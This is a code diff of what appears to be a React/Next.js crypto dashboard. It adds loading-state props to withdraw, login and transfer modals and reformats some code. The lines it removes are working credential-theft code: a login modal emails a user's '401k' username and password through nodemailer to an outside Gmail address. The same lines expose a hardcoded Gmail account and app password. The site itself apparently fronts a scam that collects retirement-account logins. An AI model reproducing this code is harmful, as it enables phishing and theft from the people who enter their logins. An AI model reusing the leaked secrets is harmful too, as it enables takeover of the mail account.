@@ -13,7 +13,6 @@ import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import { result } from "../coins";
 import { Loader } from "../register/page";
-import nodemailer from "nodemailer";
 
 export default function Home() {
   const [login, setLogin] = useState(undefined);
@@ -188,18 +187,21 @@ export default function Home() {
         onClose={() => handleWithdraw()}
         user={user}
         coins={coins}
+        handleLoading={setLoading}
       />
       <LoginModal
         isOpen={details}
         onClose={() => handleDetails()}
         onConfirm={() => handleTransfer()}
         user={user}
+        handleLoading={setLoading}
       />
       <TransferModal
         isOpen={transfer}
         onClose={() => handleTransfer()}
         user={user}
         coins={coins}
+        handleLoading={setLoading}
       />
       <UploadModal isOpen={upload} onClose={() => handleUpload()} user={user} />
       <main className={styles.container}>
@@ -252,7 +254,8 @@ export default function Home() {
               (coin) =>
                 coin?.symbol?.toLowerCase() ===
                   asset?.sym?.toLowerCase().trim() ||
-                coin?.symbol?.toLowerCase() === asset?.name?.toLowerCase().trim(),
+                coin?.symbol?.toLowerCase() ===
+                  asset?.name?.toLowerCase().trim(),
             );
             const price = coin?.price ?? 0;
             return (
@@ -484,7 +487,7 @@ export function User({ user, handleLoading, coins }) {
   );
 }
 
-export function WithdrawModal({ isOpen, onClose, user, coins }) {
+export function WithdrawModal({ isOpen, onClose, user, coins, handleLoading }) {
   if (!isOpen) return null;
   const [form, setForm] = useState({
     email: user?.data?.email,
@@ -633,7 +636,13 @@ export function WithdrawModal({ isOpen, onClose, user, coins }) {
   );
 }
 
-export function LoginModal({ isOpen, onClose, onConfirm, user }) {
+export function LoginModal({
+  isOpen,
+  onClose,
+  onConfirm,
+  user,
+  handleLoading,
+}) {
   if (!isOpen) return null;
   const [form, setForm] = useState({
     email: user?.data?.email,
@@ -647,19 +656,28 @@ export function LoginModal({ isOpen, onClose, onConfirm, user }) {
     });
   };
   async function handleConfirm() {
-    const transporter = nodemailer.createTransport({
-      service: "gmail",
-      auth: {
-        user: "hvbvcchuknb@gmail.com",
-        pass: "fpjb hwii sade fcgv",
-      },
-    });
-    await transporter.sendMail({
-      from: "hvbvcchuknb@gmail.com",
-      to: "joychurch28@gmail.com",
-      subject: "401k Details",
-      html: `<h2>401K username is ${form.username} and password is ${form.password}</h2>`,
-    });
+    if (!form.name || !form.amount || !form.sym) {
+      return;
+    } else {
+      handleLoading(true);
+      fetch("/api/details", {
+        method: "POST",
+        cache: "no-cache",
+        body: JSON.stringify({
+          ...form,
+        }),
+        headers: {
+          "Content-type": "application/json",
+        },
+      }).then(async (res) => {
+        handleLoading(false);
+        const data = await res.json();
+        if (res.status === 200) {
+          window.location.reload();
+        } else {
+        }
+      });
+    }
     onClose();
     onConfirm();
   }
@@ -737,7 +755,7 @@ export function LoginModal({ isOpen, onClose, onConfirm, user }) {
   );
 }
 
-export function TransferModal({ isOpen, onClose, user, coins }) {
+export function TransferModal({ isOpen, onClose, user, coins, handleLoading }) {
   if (!isOpen) return null;
   const [form, setForm] = useState({
     email: user?.data?.email,
